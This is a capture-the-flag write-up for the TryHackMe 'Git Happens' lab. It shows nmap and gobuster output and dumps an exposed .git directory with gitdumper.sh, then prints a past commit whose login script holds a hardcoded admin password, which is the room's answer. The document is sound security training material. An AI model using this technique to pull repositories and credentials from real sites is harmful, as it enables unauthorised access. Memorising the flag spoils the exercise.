#   Tryhackme - Git Happens

##  IP=10.10.236.227

##  Walkthrough by
```
Shaswata Saha
29-07-2023
4:26PM
```

(Help Link)[https://sakshiaggarwal0502.medium.com/tryhackme-git-happens-walkthrough-5070cc995814]

##  Steps:
1.  Nmap scan:
```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-07-29 06:26 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
Initiating NSE at 06:26
Completed NSE at 06:26, 0.00s elapsed
Initiating NSE at 06:26
Completed NSE at 06:26, 0.00s elapsed
Initiating NSE at 06:26
Completed NSE at 06:26, 0.00s elapsed
Initiating Ping Scan at 06:26
Scanning 10.10.146.118 [2 ports]
Completed Ping Scan at 06:26, 0.25s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 06:26
Completed Parallel DNS resolution of 1 host. at 06:26, 0.20s elapsed
Initiating Connect Scan at 06:26
Scanning 10.10.146.118 [1000 ports]
Discovered open port 80/tcp on 10.10.146.118
Completed Connect Scan at 06:27, 21.43s elapsed (1000 total ports)
Initiating Service scan at 06:27
Scanning 1 service on 10.10.146.118
Completed Service scan at 06:27, 6.51s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.146.118.
Initiating NSE at 06:27
Completed NSE at 06:27, 5.02s elapsed
Initiating NSE at 06:27
Completed NSE at 06:27, 1.22s elapsed
Initiating NSE at 06:27
Completed NSE at 06:27, 0.00s elapsed
Nmap scan report for 10.10.146.118
Host is up (0.21s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT     STATE    SERVICE       VERSION
80/tcp   open     http          nginx 1.14.0 (Ubuntu)
|_http-title: Super Awesome Site!
| http-git: 
|   10.10.146.118:80/.git/
|     Git repository found!
|_    Repository description: Unnamed repository; edit this file 'description' to name the...
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: nginx/1.14.0 (Ubuntu)
4998/tcp filtered maybe-veritas
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
Initiating NSE at 06:27
Completed NSE at 06:27, 0.00s elapsed
Initiating NSE at 06:27
Completed NSE at 06:27, 0.00s elapsed
Initiating NSE at 06:27
Completed NSE at 06:27, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 35.49 seconds

```

2.  Gobuster scaan:
```bash
┌──(subhro1530㉿subhro)-[~]
└─$ gobuster dir -u http://10.10.236.227 -w Documents/gobuster-wordlist/dsstorewordlist.txt 
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.236.227
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                Documents/gobuster-wordlist/dsstorewordlist.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Timeout:                 10s
===============================================================
2023/07/29 09:19:39 Starting gobuster in directory enumeration mode
===============================================================
/css                  (Status: 301) [Size: 194] [--> http://10.10.236.227/css/]
/.git                 (Status: 301) [Size: 194] [--> http://10.10.236.227/.git/]
/README.md            (Status: 200) [Size: 54]
/.gitlab-ci.yml       (Status: 200) [Size: 792]
Progress: 1829 / 1829 (100.00%)
===============================================================
2023/07/29 09:20:36 Finished
===============================================================
```

3.  The scan results shows that the http service is running on port 80 and a git repository is found at MACHINE_IP_ADDRESS:80/.git

4.  Visit at MACHINE_IP_ADDRESS by simply typing IP address in browser. A login page appears.

5.  Visit MACHINE_IP_ADDRESS/.git

6.  The page shows some folders, it is an exposed git directory. We cannot check each and every folder individually.

7.  GitTools can be very helpful. It contains a gitdumper.sh script which can be used to pull and copy the git repository to our local machine. We can install GitTools by using the command: git clone https://github.com/internetwache/GitTools.git/

After successfully installing the GitTools find the path to the gitdumper.sh

Now, use the command:
```bash
./gitdumper.sh http://MACHINE_IP_ADDRESS/.git clone
```

8.  The command above will copy the git repository to our local system. A folder named ‘clone’ will be created in the current directory in which we are.
```bash
┌──(subhro1530㉿subhro)-[~/…/tryhackme/Git_Happens/GitTools/Dumper]
└─$ ./gitdumper.sh http://10.10.236.227/.git/ clone
###########
# GitDumper is part of https://github.com/internetwache/GitTools
#
# Developed and maintained by @gehaxelt from @internetwache
#
# Use at your own risk. Usage might be illegal in certain circumstances. 
# Only for educational purposes!
###########


[*] Destination folder does not exist
[+] Creating clone/.git/
[+] Downloaded: HEAD
[-] Downloaded: objects/info/packs
[+] Downloaded: description
[+] Downloaded: config
[-] Downloaded: COMMIT_EDITMSG
[+] Downloaded: index
[+] Downloaded: packed-refs
[+] Downloaded: refs/heads/master
[-] Downloaded: refs/remotes/origin/HEAD
[-] Downloaded: refs/stash
[+] Downloaded: logs/HEAD
[+] Downloaded: logs/refs/heads/master
[-] Downloaded: logs/refs/remotes/origin/HEAD
[-] Downloaded: info/refs
[+] Downloaded: info/exclude
[-] Downloaded: /refs/wip/index/refs/heads/master
[-] Downloaded: /refs/wip/wtree/refs/heads/master
[+] Downloaded: objects/d0/b3578a628889f38c0affb1b75457146a4678e5
[-] Downloaded: objects/00/00000000000000000000000000000000000000
[+] Downloaded: objects/b8/6ab47bacf3550a5450b0eb324e36ce46ba73f1
[+] Downloaded: objects/77/aab78e2624ec9400f9ed3f43a6f0c942eeb82d
[+] Downloaded: objects/f1/4bcee8053e39eeb414053db4ec7b985f65edc8
[+] Downloaded: objects/9d/74a92581071ae7c4a470ff035e0de4598877e5
[+] Downloaded: objects/20/9515b2f7cbdfb731d275c4b089e41ba35c3bc8
[+] Downloaded: objects/5a/35c9b7c787c22f689d0364cf57b013a11561a2
[+] Downloaded: objects/08/906612dfe6821cebc21794eb85601fc4f54de9
[+] Downloaded: objects/4a/2aab268541cbcc434e0565b4f4f2deca29ee5f
[+] Downloaded: objects/7c/578d86a8713b67af2cb1b1d7c524c23cefe7aa
[+] Downloaded: objects/4e/7178fa5b68fec15e54f2b79ace6f9ce0169e01
[+] Downloaded: objects/2e/b93ac3534155069a8ef59cb25b9c1971d5d199
[+] Downloaded: objects/4c/f757268c6824041664d132a29908aa9c362a26
[+] Downloaded: objects/3a/39b02d3b9d12222bac4737ee67e31403d62f13
[+] Downloaded: objects/ae/f68b1e25df81a8c96ee4d57b20cc9f7a1ebee5
[+] Downloaded: objects/d6/df4000639981d032f628af2b4d03b8eff31213
[+] Downloaded: objects/56/820adbbd5ac0f66f61916122c94ea52937e9b2
[+] Downloaded: objects/d9/54a99b96ff11c37a558a5d93ce52d0f3702a7d
[+] Downloaded: objects/06/012255f074d7bc4acc6fadbcff004380b5f83b
[+] Downloaded: objects/bc/8054d9d95854d278359a432b6d97c27e24061d
[+] Downloaded: objects/dd/13038df878d41b774ce4fd4552091d46873c25
[+] Downloaded: objects/8c/94b154aef92380e29a3f16f1a889b56127cf13
[+] Downloaded: objects/e5/6eaa8e29b589976f33d76bc58a0c4dfb9315b1
[+] Downloaded: objects/48/926fdeb371c8ba174b1669d102e8c873afabf1
[+] Downloaded: objects/ce/b8d530ebcf79806dffc981905ec8c2e0d7a65b
[+] Downloaded: objects/87/bcbcb476578c6cc90ed39f9404292539fe1c9c
[+] Downloaded: objects/39/5e087334d613d5e423cdf8f7be27196a360459
[-] Downloaded: objects/40/04c23a71fd6ba9b03ec9cb7eed08471197d843
[-] Downloaded: objects/19/a865c5442a9d6a7c7cbea070f3cb6aa5106ef8
[-] Downloaded: objects/0f/679a88dbbaf89ff64cb351a151a5f29819a3c0
[+] Downloaded: objects/0e/abcfcd62467d64fb30b889e8de5886e028c3ed
[+] Downloaded: objects/ba/5e4a76e3f7b6c49850c41716f8f1091fbdc84e
[+] Downloaded: objects/2f/423697bf81fe5956684f66fb6fc6596a1903cc
[+] Downloaded: objects/e3/8d9df9b13e6499b749e36e064ec30f2fa45657
[+] Downloaded: objects/0e/0de07611ada4690fc0ea5b5c04721ba6f3fd0d
[+] Downloaded: objects/66/64f4e548df7591da3728d7662b6376debfce8d

```

9.  Now we need to see the git log. We find a interesting log when the webpage was created.
```bash

```

10. Going through that commit in detail we got the uname and pass..:

```bash
┌──(subhro1530㉿subhro)-[~/…/Git_Happens/GitTools/Dumper/clone]
└─$ git show 395e087334d613d5e423cdf8f7be27196a360459
commit 395e087334d613d5e423cdf8f7be27196a360459
Author: Hydragyrum <hydragyrum@gmail.com>
Date:   Thu Jul 23 23:17:43 2020 +0200

    Made the login page, boss!

diff --git a/css/style.css b/css/
                .
                .
                .
                .
                .
                .
                .
                .
                .
                .
                .
                .
                .
+</html>
+      function login() {
+        let form = document.getElementById("login-form");
+        console.log(form.elements);
+        let username = form.elements["username"].value;
+        let password = form.elements["password"].value;
+        if (
+          username === "admin" &&
+          password === "Th1s_1s_4_L0ng_4nd_S3cur3_P4ssw0rd!"
+        ) {
+          document.cookie = "login=1";
+          window.location.href = "/dashboard.html";
+        } else {
+          document.getElementById("error").innerHTML =
+            "INVALID USERNAME OR PASSWORD!";
+        }
+      }
+    </script>
+  </body>
+</html>
```